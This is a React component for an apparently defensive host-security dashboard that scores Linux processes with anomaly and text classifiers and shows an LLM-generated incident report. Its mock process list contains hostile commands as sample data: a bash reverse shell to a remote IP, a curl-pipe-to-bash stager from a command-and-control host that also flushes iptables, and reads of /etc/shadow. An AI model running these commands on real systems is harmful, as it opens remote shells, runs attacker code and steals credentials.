import React, { useState, useEffect } from 'react';
import { 
  Terminal, Shield, Cpu, AlertTriangle, CheckCircle, 
  Layers, HardDrive, ShieldAlert, Activity, Server, Radio, CornerDownRight, Check
} from 'lucide-react';
import MetricCard from '../components/MetricCard';
import LLMReportView from '../components/LLMReportView';
import { SyscallDistributionBar } from '../components/Charts';
import api from '../services/api';
import defaultLogsData from '../mockData/hostDefaultLogs.json';

// Pre-loaded realistic enterprise process traces
const ENTERPRISE_PROCESS_LIST = [
  {
    pid: 8942,
    ppid: 1,
    uid: 0,
    user: 'root',
    command: 'bash -i >& /dev/tcp/198.51.100.42/4444 0>&1 && sudo cat /etc/shadow',
    syscall: 'sys_prctl (157)',
    eventId: 157,
    argsNum: 6,
    returnValue: -1,
    threatScore: 0.942,
    risk: 'CRITICAL',
    status: 'ACTIVE EXPLOIT',
  },
  {
    pid: 9812,
    ppid: 102,
    uid: 0,
    user: 'root',
    command: 'curl -s http://malware-c2.net/stage2.sh | bash && iptables -F',
    syscall: 'sys_ptrace (101)',
    eventId: 101,
    argsNum: 8,
    returnValue: -1,
    threatScore: 0.885,
    risk: 'CRITICAL',
    status: 'C2 STAGER',
  },
  {
    pid: 4120,
    ppid: 3810,
    uid: 1001,
    user: 'analyst_temp',
    command: "cat /etc/passwd | grep -E 'root|admin' && cat /etc/shadow",
    syscall: 'sys_execve (59)',
    eventId: 59,
    argsNum: 4,
    returnValue: -13,
    threatScore: 0.585,
    risk: 'HIGH',
    status: 'SUSPICIOUS RECON',
  },
  {
    pid: 2481,
    ppid: 1204,
    uid: 1000,
    user: 'svc_monitor',
    command: 'python3 /opt/monitoring/health_check.py --interval=60',
    syscall: 'sys_execve (59)',
    eventId: 59,
    argsNum: 2,
    returnValue: 0,
    threatScore: 0.042,
    risk: 'LOW',
    status: 'AUTHORIZED',
  },
  {
    pid: 3102,
    ppid: 1,
    uid: 1000,
    user: 'svc_node',
    command: 'node /var/www/api/server.js --port 3000 --cluster=4',
    syscall: 'sys_execve (59)',
    eventId: 59,
    argsNum: 3,
    returnValue: 0,
    threatScore: 0.031,
    risk: 'LOW',
    status: 'AUTHORIZED',
  },
  {
    pid: 1045,
    ppid: 1,
    uid: 1000,
    user: 'syslog',
    command: 'rsyslogd -n -iNONE',
    syscall: 'sys_read (3)',
    eventId: 3,
    argsNum: 1,
    returnValue: 0,
    threatScore: 0.015,
    risk: 'LOW',
    status: 'AUTHORIZED',
  },
];

const SYSCALL_EVENTS = [
  { name: 'sys_execve (59)', count: 1840, color: 'bg-cyan-500' },
  { name: 'sys_prctl (157)', count: 420, color: 'bg-rose-500' },
  { name: 'sys_ptrace (101)', count: 210, color: 'bg-amber-500' },
  { name: 'sys_read / write', count: 3240, color: 'bg-emerald-500' },
];

export default function HostDashboard({ onThreatUpdate }) {
  const [selectedProcess, setSelectedProcess] = useState(ENTERPRISE_PROCESS_LIST[0]);
  const [analysisResult, setAnalysisResult] = useState(null);
  const [isLoading, setIsLoading] = useState(false);

  // Auto-run analysis on the primary critical payload on mount
  useEffect(() => {
    analyzeProcess(ENTERPRISE_PROCESS_LIST[0]);
  }, []);

  const analyzeProcess = async (proc) => {
    setIsLoading(true);
    setSelectedProcess(proc);
    try {
      const payload = {
        processId: proc.pid,
        parentProcessId: proc.ppid,
        userId: proc.uid,
        mountNamespace: 4026531840,
        eventId: proc.eventId,
        argsNum: proc.argsNum,
        returnValue: proc.returnValue,
        suspendCount: proc.risk === 'CRITICAL' ? 2 : 0,
        payload_text: proc.command,
      };

      const res = await api.analyzeHost(payload);
      setAnalysisResult(res);
      if (onThreatUpdate) {
        onThreatUpdate(res.risk_level);
      }
    } catch (err) {
      console.error('Host analysis error:', err);
    } finally {
      setIsLoading(false);
    }
  };

  const compositeScore = analysisResult?.composite_score ?? 0.942;
  const hostIsolationScore = analysisResult?.host_isolation_score ?? 0.915;
  const payloadThreatProb = analysisResult?.payload_threat_probability ?? 0.968;
  const isAnomaly = analysisResult?.is_anomaly ?? true;

  return (
    <div id="host-dashboard-view" className="space-y-6">
      {/* Executive Command Header */}
      <div className="p-6 rounded-2xl bg-[#0b1222] border border-slate-800 shadow-xl flex flex-wrap items-center justify-between gap-4">
        <div>
          <div className="flex items-center space-x-2 text-cyan-400 font-mono text-xs uppercase tracking-wider mb-1">
            <Terminal className="w-4 h-4" />
            <span>Endpoint Telemetry Vector 01 // BETH Kernel Ingestion</span>
          </div>
          <h2 className="text-xl font-black text-white font-mono tracking-tight">
            Host Security & Syscall Command Center
          </h2>
          <p className="text-xs text-slate-400 mt-1 max-w-2xl">
            Live behavioral tracing evaluating Linux kernel syscalls via Isolation Forest paired with NLP payload vectorization.
          </p>
        </div>

        <div className="flex items-center space-x-3 text-xs font-mono">
          <div className="px-3 py-1.5 rounded-xl bg-slate-900 border border-slate-800 flex items-center space-x-2">
            <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping"></span>
            <span className="text-slate-300">Monitored Daemons: <strong className="text-white">28 Active</strong></span>
          </div>
          <div className="px-3 py-1.5 rounded-xl bg-slate-900 border border-slate-800 flex items-center space-x-2">
            <Activity className="w-3.5 h-3.5 text-cyan-400" />
            <span className="text-slate-300">Syscalls Rate: <strong className="text-cyan-300">5,710 /sec</strong></span>
          </div>
        </div>
      </div>

      {/* Production Metric Cards Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <MetricCard
          title="Composite Threat Index"
          value={`${(compositeScore * 100).toFixed(1)}%`}
          score={compositeScore}
          threshold={0.65}
          subtitle="Formula: 50% Host Iso + 50% NLP Payload"
          badge={compositeScore >= 0.75 ? 'CRITICAL' : 'ELEVATED'}
          status={compositeScore >= 0.65 ? 'critical' : 'normal'}
          icon={ShieldAlert}
        />
        <MetricCard
          title="Kernel Isolation Score"
          value={`${(hostIsolationScore * 100).toFixed(1)}%`}
          score={hostIsolationScore}
          threshold={0.50}
          subtitle="Decision boundary outlier scale"
          badge="BETH MODEL"
          status={hostIsolationScore >= 0.50 ? 'critical' : 'normal'}
          icon={Terminal}
        />
        <MetricCard
          title="Payload Malicious Likelihood"
          value={`${(payloadThreatProb * 100).toFixed(1)}%`}
          score={payloadThreatProb}
          threshold={0.65}
          subtitle="TF-IDF LogReg classifier probability"
          badge="NLP VECTORIZER"
          status={payloadThreatProb >= 0.65 ? 'critical' : 'normal'}
          icon={Cpu}
        />
        <MetricCard
          title="BETH Model Status"
          value={analysisResult?.fallback_mode ? 'Baseline Heuristic' : 'ML Pipeline Active'}
          subtitle={analysisResult?.fallback_mode ? 'Fallback heuristic engine' : 'Trained Isolation Forest .joblib'}
          badge={analysisResult?.fallback_mode ? 'STANDBY' : 'TRAINED'}
          status={analysisResult?.fallback_mode ? 'warning' : 'normal'}
          icon={Server}
        />
      </div>

      {/* Prominent High-Severity Host Alert Banner */}
      {isAnomaly && (
        <div className="p-5 rounded-2xl bg-gradient-to-r from-rose-950/60 via-slate-900/90 to-rose-950/40 border border-rose-600/60 shadow-xl alert-glow-red flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-start space-x-3.5">
            <div className="p-2.5 rounded-xl bg-rose-900/80 text-rose-300 border border-rose-500/80 shrink-0">
              <ShieldAlert className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <span className="text-xs font-mono font-bold uppercase px-2 py-0.5 rounded bg-rose-950 text-rose-400 border border-rose-800">
                  Critical Host Anomaly
                </span>
                <span className="text-xs font-mono text-slate-400">
                  Target PID: <strong className="text-white">{selectedProcess.pid}</strong> ({selectedProcess.user})
                </span>
              </div>
              <h4 className="text-sm font-bold text-white mt-1 font-mono">
                Interactive Reverse Shell Spawned via Privileged Syscall
              </h4>
              <p className="text-xs text-slate-300 mt-0.5 font-mono">
                Payload: <code className="text-rose-300 bg-rose-950/80 px-1 py-0.5 rounded">{selectedProcess.command}</code>
              </p>
            </div>
          </div>

          <div className="text-right font-mono text-xs">
            <div className="text-slate-400 text-[10px]">BREACH PROBABILITY</div>
            <div className="text-2xl font-black text-rose-400">{(compositeScore * 100).toFixed(1)}%</div>
          </div>
        </div>
      )}

      {/* Middle Grid: Process Traces Table & Syscall Distribution */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Real-time Process Audit Table */}
        <div className="lg:col-span-8 rounded-2xl border border-slate-800 bg-[#0b1222] p-5 shadow-xl space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-slate-800">
            <div>
              <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-cyan-400 flex items-center">
                <Terminal className="w-4 h-4 mr-1.5" />
                Live Kernel Process Execution Audit
              </h3>
              <p className="text-[11px] text-slate-400 mt-0.5 font-mono">
                Click any process trace to profile through the BETH Isolation Forest pipeline.
              </p>
            </div>
            <span className="text-[10px] font-mono text-slate-500 uppercase font-semibold">
              {ENTERPRISE_PROCESS_LIST.length} Monitored Nodes
            </span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs font-mono">
              <thead className="bg-[#0e1628] text-slate-400 text-[10px] uppercase border-b border-slate-800">
                <tr>
                  <th className="p-3">PID / User</th>
                  <th className="p-3">Syscall Event</th>
                  <th className="p-3">Command Payload</th>
                  <th className="p-3">Threat Index</th>
                  <th className="p-3">Status</th>
                  <th className="p-3 text-right">Inspect</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60 bg-[#090f1d]/50">
                {ENTERPRISE_PROCESS_LIST.map((proc) => {
                  const isSelected = selectedProcess.pid === proc.pid;
                  return (
                    <tr
                      key={proc.pid}
                      onClick={() => analyzeProcess(proc)}
                      className={`cursor-pointer transition-colors ${
                        isSelected ? 'bg-cyan-950/40 border-l-2 border-cyan-400' : 'hover:bg-slate-800/40'
                      }`}
                    >
                      <td className="p-3">
                        <div className="font-bold text-white">PID {proc.pid}</div>
                        <div className="text-[10px] text-slate-400">{proc.user} (UID {proc.uid})</div>
                      </td>
                      <td className="p-3">
                        <span className="text-slate-300">{proc.syscall}</span>
                        <div className="text-[10px] text-slate-500">ret: {proc.returnValue}</div>
                      </td>
                      <td className="p-3 max-w-[240px]">
                        <p className="truncate text-slate-200" title={proc.command}>
                          {proc.command}
                        </p>
                      </td>
                      <td className="p-3">
                        <span className={`font-bold ${
                          proc.threatScore >= 0.75 ? 'text-rose-400' :
                          proc.threatScore >= 0.50 ? 'text-amber-400' : 'text-emerald-400'
                        }`}>
                          {(proc.threatScore * 100).toFixed(1)}%
                        </span>
                      </td>
                      <td className="p-3">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          proc.risk === 'CRITICAL' ? 'bg-rose-950 text-rose-300 border border-rose-800' :
                          proc.risk === 'HIGH' ? 'bg-amber-950 text-amber-300 border border-amber-800' :
                          'bg-emerald-950 text-emerald-300 border border-emerald-800'
                        }`}>
                          {proc.status}
                        </span>
                      </td>
                      <td className="p-3 text-right">
                        <button
                          className={`px-2 py-1 rounded text-[10px] font-bold transition ${
                            isSelected
                              ? 'bg-cyan-500 text-slate-950 shadow-sm'
                              : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                          }`}
                        >
                          {isSelected ? 'Active' : 'Trace'}
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>

        {/* Syscall Distribution & Formula Breakdown */}
        <div className="lg:col-span-4 rounded-2xl border border-slate-800 bg-[#0b1222] p-5 shadow-xl space-y-5 flex flex-col justify-between">
          <div>
            <div className="pb-3 border-b border-slate-800">
              <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-cyan-400 flex items-center">
                <Activity className="w-4 h-4 mr-1.5" />
                Kernel Syscall Execution Rates
              </h3>
              <p className="text-[11px] text-slate-400 mt-0.5 font-mono">
                Monitored kernel event frequencies (events / sec)
              </p>
            </div>

            <div className="pt-4">
              <SyscallDistributionBar events={SYSCALL_EVENTS} />
            </div>

            {/* Formula Breakdown Card */}
            <div className="mt-5 p-3.5 rounded-xl bg-[#090f1d] border border-slate-800 text-xs font-mono space-y-2">
              <div className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">
                Active Composite Scoring Formulation:
              </div>
              <div className="p-2 rounded bg-slate-900 border border-slate-800 text-cyan-300 text-center font-bold">
                ({(hostIsolationScore).toFixed(3)} × 0.50) + ({(payloadThreatProb).toFixed(3)} × 0.50) = <span className="text-white">{(compositeScore).toFixed(3)}</span>
              </div>
              <p className="text-[10px] text-slate-500">
                Formula weights kernel behavioral outlier index (50%) alongside NLP TF-IDF weaponization likelihood (50%).
              </p>
            </div>
          </div>

          <div className="p-3 rounded-xl bg-slate-900/60 border border-slate-800 text-[11px] font-mono text-slate-400">
            <span className="text-slate-300 font-bold">Host Enclave:</span> cluster-prod-node-04 (Ubuntu 22.04 LTS / Linux 5.15)
          </div>
        </div>
      </div>

      {/* Groq LLM Root Cause & Containment Section */}
      <div className="pt-2">
        <div className="flex items-center space-x-2 mb-3">
          <Cpu className="w-4 h-4 text-cyan-400" />
          <h3 className="text-sm font-mono font-bold uppercase tracking-wider text-white">
            Automated Threat Containment Dossier (Groq llama-3.3-70b-versatile)
          </h3>
        </div>
        <LLMReportView
          report={analysisResult?.incident_report}
          isLoading={isLoading}
        />
      </div>
    </div>
  );
}
